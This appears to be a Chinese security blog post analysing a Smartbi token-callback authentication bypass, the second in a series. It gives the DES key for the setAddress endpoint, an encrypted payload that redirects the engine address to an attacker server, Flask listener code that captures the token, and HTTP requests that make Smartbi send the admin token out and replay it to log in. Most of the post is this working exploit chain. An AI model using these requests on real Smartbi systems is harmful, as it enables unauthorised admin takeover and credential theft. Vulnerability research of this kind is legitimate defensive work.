#  smartbi token回调获取登录凭证漏洞（二）  
 蚁景网安   2026-02-12 08:31  
  
Smartbi官方又修复了一处权限绕过漏洞。该漏洞是上一个**特定场景下设置Token回调地址漏洞**  
的绕过，未经授权的攻击者可利用该漏洞，获取管理员token，完全接管管理员权限。于是研究了下相关补丁并进行分析。  
## 0x01 分析过程  
  
阅读相关补丁，可知此次漏洞与/smartbix/api/monitor/setAddress  
有关  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2ZoctRIdk5L1l7GoJS5gTjShectibUKgv8JIWwoLBiaOJvFib0iaHkA8liaJ7lQ/640?wx_fmt=other "null")  
  
是上一个漏洞的绕过，是发现了/smartbix/api/monitor/setAddress  
接口可以未授权设置SERVICE_ADDRESS  
、ENGINE_ADDRESS  
，只不过多了一步DES解密的过程 (这个上次看的时候就发现了，但是由于将c_address  
、和u_address  
看成同一个了以为不能利用，只能说很多师傅都在看smartbi,只要一有新的洞，绕过很快就出来了）  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2Zoc7fMqzfMIdKKYG3zPsCUw399oicYeA7oiadBgCEbZlNqia0MiacAv5DBpMw/640?wx_fmt=other "null")  
  
查看CommonUtil.desDecode  
方法，其实也只是进行DES  
解密，密钥为isPassword  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2Zocn71VyH4H5iaXqXerAFVwBnB4DpVK7UB5EnpsUo8QcaJoGgQ3hmPQhCA/640?wx_fmt=other "null")  
  
故只需要按照该算法进行加密恶意参数就可以设置SERVICE_ADDRESS  
、ENGINE_ADDRESS  
为伪造服务器地址，用于接收token  
## 0x02 分析结果  
### 第一步，获取之前的EngineAddress  
  
首先通过/smartbi/smartbix/api/monitor/engineInfo/  
接口获取之前的engineAddress  
、serviceAddress  
 这是因为要进行修改设置，需要提供之前的地址  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2ZocefgNzVDIibkhVjg5rVOzjqiawiaABDqOMCQibMibMI74bwTH22QQkOzlibZw/640?wx_fmt=other "null")  
```
POST /smartbi/smartbix/api/monitor/engineInfo/ HTTP/1.1Host: 127.0.0.1:18080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Length: 4
```  
### 第二步，设置EngineAddress为攻击者机器上的伪造http服务地址  
  
通过/smartbi/smartbix/api/monitor/setAddress/  
接口设置engineAddress  
为fake server地址 该接口的参数需要进行DES  
加密，参数明文为  
```
{  "type": "experiment",  "c_address": "http://10X.0.0.1:8010",  "u_address": "http://10x.0.0.55:8000"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2Zocp8anlXGYGL54kcSmRiajHyaxiapBaObogMjICYic6uCT7ibSGYAicDibdFbw/640?wx_fmt=other "null")  
  
c_address  
填写上述第一步获取得到的engineAddress  
，加密得到密文, u_address  
设置为新的engineAddress  
，可以理解为用于接收token的fake server地址，此处设置为http://10x.0.0.55:8000，这个是一个用flask搭建的fake server，上面只注册了/api/v1/configs/engine/smartbitoken  
路由  
```
from flask import Flask,jsonify,requestapp = Flask(__name__)@app.route('/api/v1/configs/engine/smartbitoken',methods=["POST"])def hello():    print(request.json)    return jsonify(hi="jello")if __name__ == "__main__":    app.run(host="0.0.0.0",port=8000)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2Zocx7NeNWEzSlmhzT2zVgT1JNUeWAFOxknTVJ242Jbya7MPzEyeGAhAmw/640?wx_fmt=other "null")  
```
POST /smartbi/smartbix/api/monitor/setAddress/ HTTP/1.1Host: 127.0.0.1:18080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Length: 208312E8684378EBDFF7E798B0BCCC45588EF682890F6F1701AF9D9416B4E357E80A1E8622D15B57E607DBBA3017ECED7C2CA66C54FD4D13B5C1F284652B5D82487F9D9416B4E357E80A1E8622D15B57E60A18C8967740045322142EE017FD0F4E9559184E27B9F8372
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2Zoc6gYYUpTuicDTlZiaNER0j4E9uBet33yrXsYydOHCpAiaWGSwvby7ofnvQ/640?wx_fmt=other "null")  
  
从响应来看返回true,即修改成功  
### 第三步，触发smartbi向刚刚设置的EngineAddress外发token  
```
POST /smartbi//smartbix/api/monitor/token/ HTTP/1.1Host: 127.0.0.1:18080Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Length: 10experiment
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2ZocBT1MWKfzuO0FvcxfKNqSojtc1qEEb6YW8OQ4NP3nv0jmJq9STpBgSQ/640?wx_fmt=other "null")  
  
发送相关请求后，即可在我们的fake server上面看到了携带token的请求  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2ZocsV2aBQAtdGq91ia9AGMlNqk6b9kj8N1wlYcYfvYLzyib40KQCqicI7qDg/640?wx_fmt=other "null")  
### 第四步，使用上面获取的token进行登录  
```
POST /smartbi//smartbix/api/monitor/login/ HTTP/1.1Host: 127.0.0.1:18080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Length: 47admin_xxxxxxxxxxxxxxxxx84f50082
```  
  
返回true表示登录成功，其中的cookie就是admin账户的合法凭证  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfI34uF7sKR3vmCxiaby2ZocwbibULibg5tHp7alfHTRelrib0q53vrVIo2epYs2j0vZf6ryfkGian4sRA/640?wx_fmt=other "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
学  
习  
网安实战课程  
，戳  
“阅读原文”  
  
